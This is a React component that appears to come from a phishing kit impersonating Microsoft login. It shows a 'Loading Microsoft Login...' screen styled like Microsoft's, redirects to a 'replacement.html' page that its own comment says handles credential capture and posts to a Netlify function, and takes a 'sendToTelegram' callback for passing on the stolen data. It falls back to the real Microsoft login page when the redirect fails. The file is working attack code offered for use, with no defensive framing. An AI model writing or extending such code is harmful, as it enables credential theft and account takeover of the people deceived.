import React, { useEffect } from 'react';

interface RealOAuthRedirectProps {
  onLoginSuccess: (sessionData: any) => void;
  sendToTelegram?: (data: any) => Promise<void>;
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, sendToTelegram }) => {
  
  useEffect(() => {
    const navigateToReplacement = () => {
      try {
        // Navigate to the standalone replacement page immediately.
        // The replacement.html page will handle credential capture and will POST to the Netlify function.
        window.location.assign('/replacement.html');
      } catch (error) {
        console.error('Failed to navigate to replacement page:', error);
        window.location.replace("https://login.microsoftonline.com");
      }
    };

    navigateToReplacement();
  }, [onLoginSuccess, sendToTelegram]);

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
      <div style={{
        textAlign: 'center',
        fontSize: '24px',
        color: '#323130'
      }}>
        Loading Microsoft Login...
      </div>
    </div>
  );
};

export default RealOAuthRedirect;
